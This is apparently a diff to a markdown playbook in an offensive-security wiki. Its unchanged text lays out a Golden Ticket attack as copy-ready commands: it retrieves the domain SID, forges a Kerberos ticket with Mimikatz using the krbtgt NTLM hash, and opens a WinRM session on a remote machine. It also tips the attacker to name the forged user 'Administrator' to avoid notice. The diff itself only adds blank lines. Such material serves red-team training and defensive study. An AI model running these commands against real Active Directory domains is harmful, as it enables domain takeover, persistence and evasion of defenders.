@@ -35,9 +35,15 @@ Use the domain's krbtgt NTLM hash from a domain controller to create a Golden Ti
 
 Use the domain's krbtgt NTLM hash from a domain controller to create a Golden Ticket, then use it to spawn a WinRM Session on a remote system. The krbtgt hash is generally obtained by gaining Administrator rights on a domain controller and dumping the hash via DCSync (Mimikatz, secretsdump),  LSA (Mimikatz), or Hashdump (Meterpreter).
 
+
+
 # Instructions
 
 1. Get the Domain SID
+
+
+
+
 
 **Command** ([[Get-ADDomain Get Domain Information from Active Directory]]):
 
@@ -45,7 +51,15 @@ Use the domain's krbtgt NTLM hash from a domain controller to create a Golden Ti
 Get-ADDomain -Identity $_DOMAIN
 ```
 
+
+
+
+
 2. Create a Golden ticket for the Administrator user. The name itself doesn't matter, but "Administrator" stands out less than "hackerman"
+
+
+
+
 
 **Command** ([[Mimikatz Create a Golden Ticket with the krbtgt hash]]):
 
@@ -53,13 +67,23 @@ Get-ADDomain -Identity $_DOMAIN
 Mimikatz.exe "kerberos::golden /domain:$_DOMAIN /sid:$_DOMAIN_SID /rc4:$_NTLM_HASH /user:Administrator /ptt" "exit"
 ```
 
+
+
+
+
 3. Spawn a WinRM session on a remote system with a Golden Ticket in memory
+
+
+
+
 
 **Command** ([[PSSession Spawn a WinRM Session on a Remote System]]):
 
 ```bash
 Enter-PSSession -$_TARGET
 ```
+
+
 
 Note: other tools such as PsExec can also be used instead of WinRM.
 
@@ -89,3 +113,5 @@ Note: other tools such as PsExec can also be used instead of WinRM.
 - [[NTLM]]
 - [[persistence]]
 - [[powershell]]
+
+
